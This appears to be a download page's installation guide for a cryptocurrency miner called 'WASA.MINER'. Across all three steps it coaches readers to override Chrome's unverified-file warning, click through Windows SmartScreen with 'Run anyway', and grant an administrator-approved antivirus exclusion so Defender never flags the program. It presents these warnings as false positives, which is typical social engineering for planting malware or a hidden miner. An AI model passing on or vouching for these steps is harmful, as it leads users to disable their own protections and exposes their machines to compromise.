WASA.MINER

Installation Guide

Follow this step-by-step walkthrough to safely bypass standard web browser warnings and Windows protection alerts for trusted miner execution.

STEP 01 • WEB DOWNLOAD

Bypass Browser Warning

Because WASAMiner contains cryptocurrency processing cores and is a newly released file, browsers like Google Chrome might flag the download. Click on the download progress arrow icon and select "Keep / Download unverified file" to complete the package transfer to your PC.

STEP 02 • WINDOWS PROTECTION

Unblock SmartScreen

Launch the setup installer. When the blue Windows SmartScreen shield message pops up on your desktop, click the small "More info" link located at the top of the text block. This will reveal a hidden action button; click on "Run anyway" to launch the secure installer wizard.

STEP 03 • SYSTEM SAFEGUARD

Apply Antivirus Exclusion

Once the desktop interface opens for the first time, an automated popup prompt will request permission to secure the installation directories. Click the green "Allow Exclusion" button and accept the standard Windows Admin UAC confirmation. This prevents Windows Defender from ever misinterpreting the background performance hashes as a false positive threat.
